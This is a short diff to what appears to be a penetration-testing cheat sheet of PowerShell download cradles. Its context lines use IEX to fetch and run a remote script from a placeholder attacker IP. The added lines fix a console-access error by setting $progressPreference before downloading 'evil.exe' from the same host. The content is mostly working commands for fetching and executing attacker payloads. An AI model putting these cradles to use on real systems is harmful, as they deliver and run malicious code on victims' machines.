@@ -255,4 +255,9 @@ IEX (New-Object Net.Webclient).downloadstring("http://192.168.X.X/script.ps1")
 # PowerShell 3.0+
 IEX (iwr 'http://192.168.X.X/script.ps1')
 
+If encountred the following error: 
+"Win32 internal error "Access is denied" 0x5 occurred while reading the console output buffer. Contact Microsoft Customer Support Services."
+Add ``$progressPreference = 'silentlyContinue';`` to the download cardle to be like: ``$progressPreference = 'silentlyContinue';iwr -uri http://192.168.X.X/evil.exe -outfile evil.exe"``
+
+
 ```
